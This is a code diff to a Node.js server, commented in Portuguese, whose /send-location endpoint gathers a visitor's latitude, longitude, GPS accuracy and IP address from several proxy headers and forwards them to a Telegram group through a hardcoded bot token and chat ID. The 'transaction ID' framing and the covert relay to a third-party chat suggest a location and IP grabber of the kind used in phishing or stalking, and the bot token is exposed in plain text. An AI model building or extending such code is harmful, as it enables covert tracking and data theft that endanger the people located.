@@ -34,14 +34,39 @@ const TELEGRAM_BOT_TOKEN = "7640580191:AAF7LA0-A4nd2LY_cvbjmDrLSM0KcJM3ksw"; // 
 const TELEGRAM_CHAT_ID = "-4950002868"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
 app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps, transactionId, timestamp } = req.body;
+  const { latitude, longitude, accuracy, maps, transactionId, timestamp } = req.body;
   
-  // Capturar IP do usuário
-  const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                   req.headers['x-real-ip'] || 
-                   req.connection.remoteAddress || 
-                   req.socket.remoteAddress ||
-                   'IP não disponível';
+  // Capturar IP do usuário (múltiplas fontes para compatibilidade)
+  let clientIP = 'IP não disponível';
+  
+  // Vercel usa x-forwarded-for
+  if (req.headers['x-forwarded-for']) {
+    clientIP = req.headers['x-forwarded-for'].split(',')[0].trim();
+  }
+  // Alternativas
+  else if (req.headers['x-real-ip']) {
+    clientIP = req.headers['x-real-ip'];
+  }
+  else if (req.headers['cf-connecting-ip']) {
+    clientIP = req.headers['cf-connecting-ip']; // Cloudflare
+  }
+  else if (req.connection && req.connection.remoteAddress) {
+    clientIP = req.connection.remoteAddress;
+  }
+  else if (req.socket && req.socket.remoteAddress) {
+    clientIP = req.socket.remoteAddress;
+  }
+  else if (req.ip) {
+    clientIP = req.ip;
+  }
+
+  // Log para debug (remover em produção se necessário)
+  console.log('Headers recebidos:', {
+    'x-forwarded-for': req.headers['x-forwarded-for'],
+    'x-real-ip': req.headers['x-real-ip'],
+    'cf-connecting-ip': req.headers['cf-connecting-ip'],
+    'IP capturado': clientIP
+  });
 
   const message = `📍 Nova Localização Recebida\n\n` +
     `ID da Transação: ${transactionId || 'N/A'}\n` +
@@ -49,6 +74,7 @@ app.post("/send-location", async (req, res) => {
     `IP do Cliente: ${clientIP}\n` +
     `Latitude: ${latitude}\n` +
     `Longitude: ${longitude}\n` +
+    `Precisão: ${accuracy ? accuracy.toFixed(2) + ' metros' : 'N/A'}\n` +
     `Maps: ${maps}`;
 
   try {
